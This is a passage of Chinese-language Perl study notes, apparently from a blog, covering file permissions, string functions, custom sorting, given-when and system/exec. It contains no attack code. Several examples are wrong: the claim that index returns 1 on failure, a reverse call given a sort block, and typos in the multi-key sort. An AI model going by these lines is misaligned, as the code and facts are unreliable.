class="code"><pre><code class="hljs perl"><span class="hljs-keyword">chmod</span> <span class="hljs-number">0755</span>, <span class="hljs-string">&#x27;fred&#x27;</span>, <span class="hljs-string">&#x27;barney&#x27;</span>;<br></code></pre></td></tr></table></figure><p><code>chmod</code> 会返回成功更改的条目数量.</p><p>安装 <code>File::chmod</code> 模块可以支持符号表示的权限值.</p><h2 id="修改隶属关系"><a href="#修改隶属关系" class="headerlink" title="修改隶属关系"></a>修改隶属关系</h2><p>需要使用数字形式的用户标识符及组标识符:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $user = <span class="hljs-number">1004</span>;<br><span class="hljs-keyword">my</span> $group = <span class="hljs-number">100</span>;<br><span class="hljs-keyword">chown</span> $user, $group, <span class="hljs-keyword">glob</span> <span class="hljs-string">&#x27;*.o&#x27;</span>;<br></code></pre></td></tr></table></figure><p>可以使用 <code>getpwnam</code> 函数将用户名转换成用户编号, <code>getgrnam</code> 把用户组名转换成组编号:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">defined</span>(<span class="hljs-keyword">my</span> $user = <span class="hljs-keyword">getpwnam</span> <span class="hljs-string">&#x27;merlyn&#x27;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span> <span class="hljs-string">&#x27;bad user&#x27;</span>;<br><span class="hljs-keyword">defined</span>(<span class="hljs-keyword">my</span> $group = <span class="hljs-keyword">getgrnam</span> <span class="hljs-string">&#x27;users&#x27;</span>) <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span> <span class="hljs-string">&#x27;bad group&#x27;</span>;<br><span class="hljs-keyword">chown</span> $user, $group, <span class="hljs-keyword">glob</span> <span class="hljs-string">&#x27;/home/merlyn/*&#x27;</span>;<br></code></pre></td></tr></table></figure><p><code>chown</code> 会返回受影响的文件数量.</p><h2 id="修改时间戳"><a href="#修改时间戳" class="headerlink" title="修改时间戳"></a>修改时间戳</h2><p>使用 <code>utime</code> 函数, 前两个参数是新的访问时间和更改时间, 其余参数是要修改时间戳的文件名列表. 时间格式采用的是内部时间戳的格式 (stat 和 lstat 函数).</p><p>如:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $now = <span class="hljs-keyword">time</span>;<br><span class="hljs-keyword">my</span> $ago = $now - <span class="hljs-number">24</span> * <span class="hljs-number">60</span> * <span class="hljs-number">60</span>;<br><span class="hljs-keyword">utime</span> $now, $ago, <span class="hljs-keyword">glob</span> <span class="hljs-string">&#x27;*&#x27;</span>;<br></code></pre></td></tr></table></figure><h1 id="第十四章-字符串与排序"><a href="#第十四章-字符串与排序" class="headerlink" title="第十四章 字符串与排序"></a>第十四章 字符串与排序</h1><h2 id="用-index-查找子字符串"><a href="#用-index-查找子字符串" class="headerlink" title="用 index 查找子字符串"></a>用 index 查找子字符串</h2><p>找出子字符串在主字符串中的相对位置:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">$where = <span class="hljs-keyword">index</span>($big, $small);<br></code></pre></td></tr></table></figure><p>返回值是整数, 表示首次出现的第一个字符的位置. 从零算起. 无法找到, 就会返回 1.</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $stuff = <span class="hljs-string">&quot;Howdy world!&quot;</span>;<br><span class="hljs-keyword">my</span> $where = <span class="hljs-keyword">index</span>($stuff, <span class="hljs-string">&quot;wor&quot;</span>);<br></code></pre></td></tr></table></figure><p>返回 6.</p><p>可指定开始查找的位置 (第三个参数):</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $stuff = <span class="hljs-string">&quot;Howdy world!&quot;</span>;<br><span class="hljs-keyword">my</span> $where = <span class="hljs-keyword">index</span>($stuff, <span class="hljs-string">&quot;wor&quot;</span>, <span class="hljs-number">2</span>);<br><br></code></pre></td></tr></table></figure><p><code>rindex</code> 返回最后出现的位置.</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $last_slash = <span class="hljs-keyword">rindex</span>(<span class="hljs-string">&quot;/etc/passwd&quot;</span>, <span class="hljs-string">&quot;/&quot;</span>);<br></code></pre></td></tr></table></figure><p>结果为四. 其第三个参数用来限定返回值的上限.</p><h2 id="用-substr-操作子字符串"><a href="#用-substr-操作子字符串" class="headerlink" title="用 substr 操作子字符串"></a>用 substr 操作子字符串</h2><p>如:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $part = <span class="hljs-keyword">substr</span>($string, $initial_position, $length);<br></code></pre></td></tr></table></figure><p>可不用指定长度, 直接取到结尾如:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $pebble = <span class="hljs-keyword">substr</span> <span class="hljs-string">&quot;Fred J. Flinstone&quot;</span>, <span class="hljs-number">13</span>;<br></code></pre></td></tr></table></figure><p>起始位置为负数表示倒数.</p><p>和 <code>index</code> 配合使用:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $long = <span class="hljs-string">&quot;some very very long string&quot;</span>;<br><span class="hljs-keyword">my</span> $right = <span class="hljs-keyword">substr</span>($long, <span class="hljs-keyword">index</span>($long, <span class="hljs-string">&quot;l&quot;</span>));<br></code></pre></td></tr></table></figure><p>修改字符串被选取的部分:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $string = <span class="hljs-string">&quot;Hello, world&quot;</span>;<br><span class="hljs-keyword">substr</span>($string, <span class="hljs-number">0</span>, <span class="hljs-number">5</span>) = <span class="hljs-string">&quot;Goodbye&quot;</span>;<br></code></pre></td></tr></table></figure><p>变量 <code>string</code> 的前五个字符被替换为后面的字符串, 即 “Goodbye”. (也就是前五个字符被选取出来进行处理).</p><p>等同于:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $previous_value = <span class="hljs-keyword">substr</span>($string, <span class="hljs-number">0</span>, <span class="hljs-number">5</span>, <span class="hljs-string">&quot;Goodbye&quot;</span>);<br></code></pre></td></tr></table></figure><p>配合 <code>=~</code> 和正则表达式:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">substr</span>($string, -<span class="hljs-number">20</span>) =~ <span class="hljs-regexp">s/fred/barney/g</span>;<br></code></pre></td></tr></table></figure><h2 id="用-sprintf-格式化字符串"><a href="#用-sprintf-格式化字符串" class="headerlink" title="用 sprintf 格式化字符串"></a>用 sprintf 格式化字符串</h2><p>其返回格式化之后的字符串而不是打印.</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $date_tag = <span class="hljs-keyword">sprintf</span> <span class="hljs-string">&quot;%4d/%02d/%02d %2d:%02d:%02d&quot;</span>, $ye, $mo, $da, $h, $m, $s;<br></code></pre></td></tr></table></figure><p>格式化定义中数字字段的前置零表示必要时会在数字前补零以符合指定的宽度.</p><h2 id="用-sprintf-格式化金额数字"><a href="#用-sprintf-格式化金额数字" class="headerlink" title="用 sprintf 格式化金额数字"></a>用 sprintf 格式化金额数字</h2><p>使用 <code>%.2f</code> 这种限定小数位.</p><p>有用的程序:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">big_money</span> </span>&#123;<br>    <span class="hljs-keyword">my</span> $number = <span class="hljs-keyword">sprintf</span> <span class="hljs-string">&quot;%.2f&quot;</span>, <span class="hljs-keyword">shift</span> @_;<br>    <span class="hljs-number">1</span> <span class="hljs-keyword">while</span> $number =~ <span class="hljs-regexp">s/^(-?\d+)(\d\d\d)/$1,$2/</span>;<br>    $number =~ <span class="hljs-regexp">s/^(-?)/$1\$/</span>;<br>    $number;<br>&#125;<br></code></pre></td></tr></table></figure><p>看不懂就翻书.</p><h2 id="非十进制数字字符串的转换"><a href="#非十进制数字字符串的转换" class="headerlink" title="非十进制数字字符串的转换"></a>非十进制数字字符串的转换</h2><p>使用 <code>hex()</code> 或 <code>oct</code> 进行转换.</p><p><code>0b</code> 开头表示二进制. <code>0x</code> 开头表示十六进制, 其他的表示为八进制.<br><img src="/../img/convery_to_disimal.png"></p><h2 id="高级排序"><a href="#高级排序" class="headerlink" title="高级排序"></a>高级排序</h2><p>Perl 允许你建立自己的 “排序规则子程序 (sort-definition subroutine)”.</p><p>排序子程序并不需要排序许多元素, 只要能比较两个元素, Perl 就有办法 (通过不断咨询排序子程序) 返回排好序的数据.</p><p>示例:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">by_number</span> </span>&#123;<br>    <span class="hljs-keyword">if</span> ($a &lt; $b) &#123; -<span class="hljs-number">1</span> &#125; <span class="hljs-keyword">elsif</span> ($a &gt; $b) &#123; <span class="hljs-number">1</span> &#125; <span class="hljs-keyword">else</span> &#123; <span class="hljs-number">0</span> &#125;<br>&#125;<br><br><span class="hljs-keyword">my</span> @result = <span class="hljs-keyword">sort</span> by_number @some_numbers;<br></code></pre></td></tr></table></figure><p>使用排序用的子程序, 不用加 <code>&amp;</code>, 放在 <code>sort</code> 关键词和待排序列表之间.</p><p>排序子程序满足的条件是:</p><ul><li>如果 <code>$a</code> 排在 <code>$b</code> 之前, 返回 <code>-1</code></li><li>如果 <code>$b</code> 排在 <code>$a</code> 之前, 返回 <code>1</code></li><li>无所谓先后返回 <code>0</code></li></ul><p>记忆方法, <code>$a &lt; $b</code>, 可以看成 <code>-1 0 1</code>, <code>$a</code> 排在前面就是左边的 <code>-1</code>, <code>$b</code> 排在前面就是右边的 <code>1</code>.</p><p>许多排序子程序的名称都是以 <code>by_</code> 开头的.</p><p>在排序子程序中并不需要去设定 <code>$a</code> 和 <code>$b</code>, 交给 Perl 去完成就好.</p><p>使用飞船操作符 <code>&lt;=&gt;</code> 会更加简洁, 这个操作符会比较两个数字并返回 <code>-1</code>, <code>0</code>, 或 <code>1</code>.</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">by_number</span> </span>&#123; $a &lt;=&gt; $b &#125;<br></code></pre></td></tr></table></figure><p>飞船操作符只能用来比较数字.</p><p>使用 <code>cmp</code> 来比较字符串. (返回三种比较结果) <code>cmp</code> 所提供的排序与 sort 默认的排序规则相同. (ASCII 码)</p><p>如:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">by_code_point</span> </span>&#123; $a cmp $b &#125;<br><br><span class="hljs-keyword">my</span> @string = <span class="hljs-keyword">sort</span> by_code_point @any_strings;<br></code></pre></td></tr></table></figure><p>不区分大小写的排序:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">case_insensitive</span> </span>&#123; <span class="hljs-string">&quot;\L$a&quot;</span> cmp <span class="hljs-string">&quot;\L$b&quot;</span> &#125;<br></code></pre></td></tr></table></figure><p>一般来说, 对 Unicode 字符串排序, 都会写成:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> Unicode::Normalize<br><br><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">equivalents</span> </span>&#123; NFKD($a) cmp NFKD($b) &#125;<br><br><span class="hljs-keyword">my</span> @string = <span class="hljs-keyword">sort</span> equivalents @any_strings;<br></code></pre></td></tr></table></figure><p>出于性能的考虑, <code>$a</code> 和 <code>$b</code> 并非数据项拷贝, 实际上它们只是原始列表元素的临时别名. 在中途改变它们的值, 会弄乱原始数据.</p><p>更简单的内嵌排序子程序:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> @numbers = <span class="hljs-keyword">sort</span> &#123; $a &lt;=&gt; $b&#125; @some_numbers; <br></code></pre></td></tr></table></figure><p>以递减的顺序进行排序, 使用 <code>reverse</code> 函数:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> @numbers = <span class="hljs-keyword">reverse</span> &#123; $a &lt;=&gt; $b&#125; @some_numbers; <br></code></pre></td></tr></table></figure><h2 id="按哈希值排序"><a href="#按哈希值排序" class="headerlink" title="按哈希值排序"></a>按哈希值排序</h2><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> %score = (<span class="hljs-string">&quot;barney&quot;</span> =&gt; <span class="hljs-number">195</span>, <span class="hljs-string">&quot;fred&quot;</span> =&gt; <span class="hljs-number">205</span>, <span class="hljs-string">&quot;dino&quot;</span> =&gt; <span class="hljs-number">30</span>);<br><br><span class="hljs-keyword">my</span> @winners = <span class="hljs-keyword">sort</span> by_score <span class="hljs-keyword">keys</span> %score;<br><br><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">by_score</span> </span>&#123; $score&#123;$b&#125; &lt;=&gt; $score<span class="hljs-string">&#123;a&#125;</span> &#125;<br></code></pre></td></tr></table></figure><h2 id="按多个键排序"><a href="#按多个键排序" class="headerlink" title="按多个键排序"></a>按多个键排序</h2><p>上面的类型, 但是有分数相同情况.</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> %score = (<br><span class="hljs-string">&quot;barney&quot;</span> =&gt; <span class="hljs-number">195</span>,<br><span class="hljs-string">&quot;fred&quot;</span> =&gt; <span class="hljs-number">205</span>,<br><span class="hljs-string">&quot;dino&quot;</span> =&gt; <span class="hljs-number">30</span>,<br><span class="hljs-string">&quot;bamm-bamm&quot;</span> =&gt; <span class="hljs-number">30</span>,<br>);<br><br><span class="hljs-keyword">my</span> @winners = <span class="hljs-keyword">sort</span> by_score_and_name <span class="hljs-keyword">keys</span> %score;<br><br><span class="hljs-function"><span class="hljs-keyword">sub</span> <span class="hljs-title">by_score_and_name</span> </span>&#123;<br>    $score&#123;$b&#125; &lt;=&gt; $score&#123;$a&#125; <br>    <span class="hljs-keyword">or</span> <br>    $a cmp $b<br>&#125;<br></code></pre></td></tr></table></figure><p>排序的级数可以不止两级, 书中的示例五级代码:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs perl">@patron_IDs = <span class="hljs-keyword">sort</span> &#123;<br>    &amp;fines($b) &lt;=&gt; &amp;fines($1) <span class="hljs-keyword">or</span><br>    $items&#123;$b&#125; &lt;=&gt; $items&#123;$b&#125; <span class="hljs-keyword">or</span><br>    $family_name&#123;$a&#125; cmp $family_name&#123;$b&#125; <span class="hljs-keyword">or</span><br>    $personal_name&#123;$a&#125; cmp $family_name&#123;$b&#125; <span class="hljs-keyword">or</span><br>    $a &lt;=&gt; $b<br>&#125; @patron_IDs;<br></code></pre></td></tr></table></figure><h1 id="第十五章-智能匹配与-given-when-结构"><a href="#第十五章-智能匹配与-given-when-结构" class="headerlink" title="第十五章 智能匹配与 given-when 结构"></a>第十五章 智能匹配与 given-when 结构</h1><p>智能匹配是从 Perl 5.10.0 开始出现的.</p><h2 id="智能匹配操作符"><a href="#智能匹配操作符" class="headerlink" title="智能匹配操作符"></a>智能匹配操作符</h2><p>智能匹配操作符 <code>~~</code> 会根据两边的操作数的数据类型自动判断改用何种方式进行比较或匹配. 有时, 甚至能取代绑定操作符 <code>=~</code></p><p>如在哈系 <code>%name</code> 中查找任何匹配 <code>Fred</code> 的键:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> <span class="hljs-number">5.0100001</span>;<br><br><span class="hljs-keyword">say</span> <span class="hljs-string">&quot;I found a key matching &#x27;Fred&#x27;&quot;</span> <span class="hljs-keyword">if</span> %names ~~ <span class="hljs-regexp">/Fred/</span>;<br></code></pre></td></tr></table></figure><p>可参考 perlsyn 文档中关于智能匹配的表. (Smart matching in detail)</p><h2 id="智能匹配操作的优先级"><a href="#智能匹配操作的优先级" class="headerlink" title="智能匹配操作的优先级"></a>智能匹配操作的优先级</h2><p>当使用智能匹配操作符时, Perl 会按表自上而下查看适用的操作书配对, 先找到哪一种搭配就选择哪一种操作.</p><h2 id="given-语句"><a href="#given-语句" class="headerlink" title="given 语句"></a>given 语句</h2><p><code>given-when</code> 控制结构能够根据 given 后面的参数执行某个条件对应的语句块. 和 C 中的 switch 语句对应.</p><p>隐式写法:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> <span class="hljs-number">5.0100001</span><br><br><span class="hljs-keyword">given</span> ( $ARGV[<span class="hljs-number">0</span>] ) &#123;<br>    <span class="hljs-keyword">when</span> ( <span class="hljs-string">&#x27;Fred&#x27;</span> )     &#123; <span class="hljs-keyword">say</span> <span class="hljs-string">&#x27;Name is Fred&#x27;</span> &#125;<br>    <span class="hljs-keyword">when</span> ( <span class="hljs-regexp">/fred/i</span> )    &#123; <span class="hljs-keyword">say</span> <span class="hljs-string">&#x27;Name has fred in it&#x27;</span> &#125;<br>    <span class="hljs-keyword">when</span> ( <span class="hljs-regexp">/\AFred/</span> )   &#123; <span class="hljs-keyword">say</span> <span class="hljs-string">&#x27;Name starts with Fred&#x27;</span> &#125;<br>    default             &#123; <span class="hljs-keyword">say</span> <span class="hljs-string">&quot;I don&#x27;t see a Fred&quot;</span> &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>显式写法:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> <span class="hljs-number">5.0100001</span><br><br><span class="hljs-keyword">given</span> ( $ARGV[<span class="hljs-number">0</span>] ) &#123;<br>    <span class="hljs-keyword">when</span> ( $_ ~~ <span class="hljs-string">&#x27;Fred&#x27;</span> )     &#123; <span class="hljs-keyword">say</span> <span class="hljs-string">&#x27;Name is Fred&#x27;</span>; <span class="hljs-keyword">break</span> &#125;<br>    <span class="hljs-keyword">when</span> ( $_ ~~ <span class="hljs-regexp">/fred/i</span> )    &#123; <span class="hljs-keyword">say</span> <span class="hljs-string">&#x27;Name has fred in it&#x27;</span>; <span class="hljs-keyword">break</span> &#125;<br>    <span class="hljs-keyword">when</span> ( $_ ~~ <span class="hljs-regexp">/\AFred/</span> )   &#123; <span class="hljs-keyword">say</span> <span class="hljs-string">&#x27;Name starts with Fred&#x27;</span>; <span class="hljs-keyword">break</span> &#125;<br>    default             &#123; <span class="hljs-keyword">say</span> <span class="hljs-string">&quot;I don&#x27;t see a Fred&quot;</span>; <span class="hljs-keyword">break</span> &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>可以看到有智能匹配和 <code>break</code>.</p><p><code>given-when</code> 可以在满足某个条件的基础上继续测试其他条件, 在 <code>when</code> 语句块的末尾使用 <code>continue</code>, Perl 就会尝试执行后续的 <code>when</code> 语句.</p><h2 id="笨拙匹配"><a href="#笨拙匹配" class="headerlink" title="笨拙匹配"></a>笨拙匹配</h2><p>指自己明确书写操作符:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> <span class="hljs-number">5.0100001</span>;<br><br><span class="hljs-keyword">given</span> ( $ARGV[<span class="hljs-number">0</span>] ) &#123;<br>    <span class="hljs-keyword">when</span> ( $_ eq <span class="hljs-string">&#x27;Fred&#x27;</span>)    &#123; <span class="hljs-keyword">say</span> <span class="hljs-string">&#x27;Name is Fred&#x27;</span>; <span class="hljs-keyword">continue</span> &#125;<br>    <span class="hljs-keyword">when</span> ( $_ =~ <span class="hljs-regexp">/\AFred/</span> ) &#123; <span class="hljs-keyword">say</span> <span class="hljs-string">&#x27;Name starts with Fred&#x27;</span>; <span class="hljs-keyword">continue</span> &#125;<br>    <span class="hljs-keyword">when</span> ( $_ =~ <span class="hljs-regexp">/fred/i</span> )  &#123; <span class="hljs-keyword">say</span> <span class="hljs-string">&#x27;Name has fred in it&#x27;</span>; &#125;<br>    default                 &#123; <span class="hljs-keyword">say</span> <span class="hljs-string">&#x27;Name is Fred&#x27;</span> &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>也可以智能匹配和笨拙匹配混用.</p><p>智能匹配操作符用于判断事物是否相同 (或者差不多是相同), 所以在需要比较大小时, 就不能用智能匹配.</p><p>否定的表达式, 包括否定的正则表达式, 都不会使用智能匹配方式.</p><h2 id="多个条目的-when-匹配"><a href="#多个条目的-when-匹配" class="headerlink" title="多个条目的 when 匹配"></a>多个条目的 when 匹配</h2><p>要遍历多个元素, 可以直接省略 <code>given</code>, 让 <code>foreach</code> 将当前正在遍历的元素放入它自己的 <code>$_</code> 里:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">use</span> <span class="hljs-number">5.0100001</span>;<br><br><span class="hljs-keyword">foreach</span> ( @name ) &#123;<br>    <span class="hljs-keyword">when</span> ( <span class="hljs-regexp">/fred/i</span> )    &#123; <span class="hljs-keyword">say</span> <span class="hljs-string">&#x27;Name has fred in it&#x27;</span>; <span class="hljs-keyword">continue</span> &#125;<br>    <span class="hljs-keyword">when</span> ( <span class="hljs-regexp">/\AFred/</span> )   &#123; <span class="hljs-keyword">say</span> <span class="hljs-string">&#x27;Name starts with Fred&#x27;</span>; <span class="hljs-keyword">continue</span> &#125;<br>    <span class="hljs-keyword">when</span> ( <span class="hljs-regexp">/fred/i</span> )    &#123; <span class="hljs-keyword">say</span> <span class="hljs-string">&#x27;Name has fred in it&#x27;</span>; &#125;<br>    default             &#123; <span class="hljs-keyword">say</span> <span class="hljs-string">&#x27;Name is Fred&#x27;</span> &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="第十六章-进程管理"><a href="#第十六章-进程管理" class="headerlink" title="第十六章 进程管理"></a>第十六章 进程管理</h1><h2 id="system-函数"><a href="#system-函数" class="headerlink" title="system 函数"></a>system 函数</h2><p>用于启动子进程.</p><p>调用 Unix 的 date 命令:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">system</span> <span class="hljs-string">&#x27;date&#x27;</span>;<br></code></pre></td></tr></table></figure><p>此时的 Perl 程序称为父进程 (parent). 运行时, <code>system</code> 命令根据当前的父进程创建一份拷贝, 这份拷贝称为子进程 (child), 其继承了原来进程中 Perl 的标准输入, 标准输出以及标准错误.</p><p>通常提供给 system 函数的参数就是那些一般在 shell 中键入的命令.</p><p>如:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">system</span> <span class="hljs-string">&#x27;ls -l $HOME&#x27;</span><br></code></pre></td></tr></table></figure><p>这里用的单引号, 否则会被认为是 Perl 中的标量符号.</p><p>当命令简单时, 不会调用 <code>/bin/sh</code> 这种 shell.</p><h2 id="避免使用-Shell"><a href="#避免使用-Shell" class="headerlink" title="避免使用 Shell"></a>避免使用 Shell</h2><p>使用多个参数来调用:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">my</span> $tarfile = <span class="hljs-string">&#x27;something*wicked.tar&#x27;</span>;<br><span class="hljs-keyword">my</span> @dirs = <span class="hljs-string">qw(fred|flintstone &lt;barney&amp;rubble&gt; betty )</span>;<br><span class="hljs-keyword">system</span> <span class="hljs-string">&#x27;tar&#x27;</span>, <span class="hljs-string">&#x27;cvf&#x27;</span>, $tarfile, @dirs;<br></code></pre></td></tr></table></figure><p><code>system</code> 操作符的返回值是根据子进程的结束状态来决定的.</p><h2 id="环境变量"><a href="#环境变量" class="headerlink" title="环境变量"></a>环境变量</h2><p>Perl 会在需要时用 PATH 环境变量来搜索程序以便运行.</p><p>在 Perl 中, 环境变量可通过特殊的 <code>%ENV</code> 哈希取得, 其中每个键都代表一个环境变量. 在程序开始运行时, <code>%ENV</code> 会保留从父进程 (通常为 shell) 继承而来的设定值, 修改次哈希就能改变环境变量, 它会被新进程继承.</p><p>如:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs perl">$ENV&#123;<span class="hljs-string">&#x27;PATH&#x27;</span>&#125; = <span class="hljs-string">&quot;/home/rootbeer/bin:$ENV&#123;&#x27;PATH&#x27;&#125;&quot;</span>;<br></code></pre></td></tr></table></figure><h2 id="exec-函数"><a href="#exec-函数" class="headerlink" title="exec 函数"></a>exec 函数</h2><p>所有适用于 <code>system</code> 函数的所有语法也都适用于 <code>exec</code> 函数.</p><p>区别: <code>system</code> 函数会创建子进程, 子进程会在 Perl 睡眠期间执行任务. <code>exec</code> 函数却导致 Perl 进程自己去执行任务. </p><p>如:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">chdir</span> <span class="hljs-string">&#x27;/tmp&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-keyword">die</span> <span class="hljs-string">&quot;Cannot chdir /tmp: $!&quot;</span>;<br><span class="hljs-keyword">exec</span> <span class="hljs-string">&#x27;bedrock&#x27;</span>, <span class="hljs-string">&#x27;-o&#x27;</span>, <span class="hljs-string">&#x27;args1&#x27;</span>, @ARGV;<br></code></pre></td></tr></table></figure><p>当运行到 exec 时, Perl 找到 <code>bedrock</code> 并且 “跳进去” 执行, 此后, 就没有 Perl 进程了, 只有那个运行 <code>bedrock</code> 命令的进程, 这样在 <code>bedrock</code> 运行结束时, 没有 Perl 进程在等待. (也就是说, Perl 创建了一个子进程, 然后被这个子进程替换掉)</p><p><code>exec</code> 调用之后写的代码都无法运行. 不过如果启动过程出现错误, 那么后续的捕获语句还是可以继续运行的:</p><figure class="highlight perl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs perl"><span class="hljs-keyword">exec</span> <span class="hljs-string">&#x27;date&#x27;</span>;<br><span 